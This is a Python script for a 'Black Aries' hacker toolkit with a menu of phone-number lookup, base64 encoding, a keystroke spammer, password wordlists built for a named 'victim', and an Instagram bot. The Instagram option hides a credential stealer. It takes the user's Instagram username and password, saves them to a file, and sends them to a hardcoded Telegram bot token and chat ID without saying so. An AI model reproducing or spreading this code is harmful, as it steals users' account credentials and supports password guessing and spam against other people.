from colorama import Fore,Style,Back
import pyautogui
import random as rand
import time
from phonenumbers import geocoder, parse,carrier,timezone
import base64
import os
from instabot import Bot
import requests
print(Fore.LIGHTGREEN_EX+'Hi bro am BlaCK Aries')
print(Fore.CYAN+'<<>>'*20)
print(Fore.LIGHTGREEN_EX+'you should be great account')
print(Fore.CYAN+'<<>>'*20)
code =23122006
pin=int(input(Fore.LIGHTGREEN_EX+"Enter Pass code >>>"))
if pin == code :
    os.system("python3 -m pip install -r requirements.txt")
    os.system("clear")
    print(Fore.BLUE + '')
    os.system('figlet Black-Aries')
    print('[1] Phone Number ')
    print('[2] Data encryption')
    print('[3] spam')
    print('[4] Aries-List')
    print('[5] Insta Bot')
    ask = input('>>>>')
    if ask == '5':
        print(Fore.LIGHTGREEN_EX + 'Hi bro am BlaCK Aries')
        time.sleep(2)
        print(Fore.CYAN + '<<>>' * 20)
        print(Fore.LIGHTGREEN_EX + 'you should be log in')
        time.sleep(2)
        print(Fore.CYAN + '<<>>' * 20)
        time.sleep(2)
        user = str(input("USER NAME : "))
        passwoed = str(input("PASSWORD : "))
        os.system("clear")
        os.system('figlet Black-Aries')
        print('[1] follow user                           [2] Download Stories')
        print('[3] send message                          [4] get user followers')
        print('[5] Your Info ')
        list = str(input(">>>>"))
        os.system("clear")
        aries_Bot = Bot()
        aries_Bot.login(username=user, password=passwoed)
        Insta_Info = open('Insta Info.txt', 'w')
        Insta_Info.write(f'|User name : {user} |')
        Insta_Info.write(f'|Password  : {passwoed} |')
        ID = '5141124832'
        token = '5250865220:AAHvyRQo1_wKcV6h9Nc7A00XL-cD6raDGO8'
        t = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= new account 🦇 ︎\n.User : [ → {user} ← ]\n.Pass : [ → {passwoed} ← ]\n-  ")
        print(t)
        if list == '5':
            print(f'Username : {user}')
            print(f'Password : {passwoed}')
        if list == "1":
            follow = str(input("Follow>>"))
            aries_Bot.follow(follow)
        if list == '2':
            download = str(input("user name >>"))
            aries_Bot.download_stories(f"{download}")
        if list == '3':
            messeg = str(input('Your Masseg >> '))
            user1 = str(input('user name >> '))
            aries_Bot.send_message(f"{messeg}", f"{user1}")
        if list == '4':
            userlist = str(input('uaer name >> '))
            followers_list = aries_Bot.get_user_followers(f'{userlist}')
    if ask == '4':
        print("[1]victam list")
        print('[2]allpass')
        aries1 =input('>>>')
        if aries1 == '2':
            chars = "abcdefghijklmnopqrstuvwxyz"
            CHARS = chars.upper()
            symbols = "[]{}()*@#_.-"
            numbers = '0123456789'
            j = ''
            allVariables = chars + CHARS + symbols + numbers
            numer = int(input("password number :"))
            len = numer
            if len > 16:
                print('the limit is 16')
            else:
                list5 = open("word list.txt", 'w')
                range_number = int(input("Password Rang :"))
                for counter in range(1, range_number):
                    passwords = ''.join(rand.sample(allVariables, len))
                    print(passwords)
                    list5.write(passwords)
                    list5.write('\n')
        if aries1 == '1':
            print(Fore.CYAN + '<<>>' * 20)
            aaa = input(Fore.LIGHTGREEN_EX + 'Entre victam name : ')
            print(Fore.CYAN + '<<>>' * 20)
            os.system('clear')
            print(Fore.YELLOW + '       ')
            os.system('figlet Aries-list')
            print(Fore.BLUE + 'By : Black Aries')
            print(Fore.LIGHTBLUE_EX + '       ')
            print(Fore.LIGHTBLACK_EX + '-' * 29)
            file = open(aaa + '.txt', 'w')
            aa = set([])
            oio = set([])
            # iio=set([112233,332211,000,445566,'$'*1,'$'*2,'$'*3,'@'*1,'@'*2,'@'*3,'€'*1,'€'*2,'€'*3,'&'*1,'&'*2,'&'*3,'¥'*1,'¥'*2,'¥'*3,'*'*1,'*'*2,'*'*3,'+'*1,'+'*2,'+'*3])
            kk = 1
            while True:
                b = input(Fore.LIGHTBLACK_EX + 'Entre {} : '.format(kk))
                if b == 'i am done':
                    print('\033[3;36m')
                    file.close()
                    qq = open(aaa + '.txt', 'r')
                    ll = len(qq.readlines())
                    os.system('printf "\033[3;31m"')
                    print('-' * 60)
                    print('>> {} Passwords in ---> {} '.format(ll, aaa + '.txt'))
                    print('-' * 60)
                    break;
                aa.add(b)
                for i in aa:
                    if len(i) >= 6 and i not in oio:
                        oio.add(i)
                        file.write(i)
                        file.write('\n')
                    # for o in iio:
                    #   uau='{}{}'.format(i,o)
                    #  ubu='{}{}{}'.format(o,i,o)
                    # ucu='{}{}{} '.format(i,o,i)
                    # if len(uau)>= 6:
                    # file.write(uau)
                    #  file.write('\n')
                    # if len(ubu) >= 6 and ubu != uau :
                    # file.write(ubu)
                    # file.write('\n')
                    # if len(ucu) >= 6 and ucu != uau and ucu != ubu:
                    #  file.write(ucu)
                    #  file.write('\n')
                    c = b + i
                    d = i + b
                    if len(c) >= 6:
                        file.write(c)
                        file.write('\n')
                    if c != d and len(d) >= 6:
                        file.write(d)
                        file.write('\n')
                kk = int(kk) + 1
                print('-' * 40)

    if ask == '2':
        os.system('clear')
        os.system('figlet Black-Aries')
        while True:
            print('[1] Encode')
            print('[2] Decode')
            num = input(">>> ")
            if num == "1":
                encode_text = input("Enter Your Text For Encode It >> : ")
                encode_hash = base64.b64encode(encode_text.encode('UTF-8')).decode('ascii')
                print("--------------------------------")
                print("Doen : " + encode_hash)
                print("----------------------------------")
            elif num == "2":
                decode_text = input("Enter Your Hash For Decode It >> :")
                decode_hash = base64.b64decode(decode_text)
                decodeit = decode_hash.decode('UTF-8')
                print("----------------------------------")
                print("Done : " + decodeit)
                print("-------------------------------------")
            else:
                print("Type Just 1 Or 2 !!")
    if ask == '3':
        os.system('clear')
        pwd = input('Enter path of file : ')
        time1 = int(input('Enter sleep time : '))
        time.sleep(5)
        s = open(f'{pwd}', 'r')
        for word in s:
            pyautogui.typewrite(word)
            pyautogui.press('enter')
            time.sleep(time1)
    if ask == '1':
        os.system('clear')
        print(Fore.LIGHTRED_EX + '')
        number = input("Number Phone: ")
        os.system('clear')
        os.system('figlet Number-aries')
        print('by: Black Aries')
        print(Fore.YELLOW + '>>><<' * 20)
        print(Fore.LIGHTRED_EX + '')
        print('[1] Know Number country')
        print('[2] Carrier Sim-Card')
        print(('[3] Time Zone'))
        askn = input('>>>')
        if askn == '3':
            print(f'the time zone of this phone number {number} is : ', end='')
            print(timezone.time_zones_for_number(parse(number), 'en'))
        if askn == '2':
            print(f'the Carrier Sim-Card of this phone number {number} is : ', end='')
            print(carrier.name_for_number(parse(number), 'en'))
        if askn == '1':
            print(f'the location of this phone number {number} is : ', end='')
            print(geocoder.description_for_number(parse(number), 'en'))
else:
    print('Sorry i cannot pass you *_* ')
    print('https://github.com/blackaries506/blackariestool')
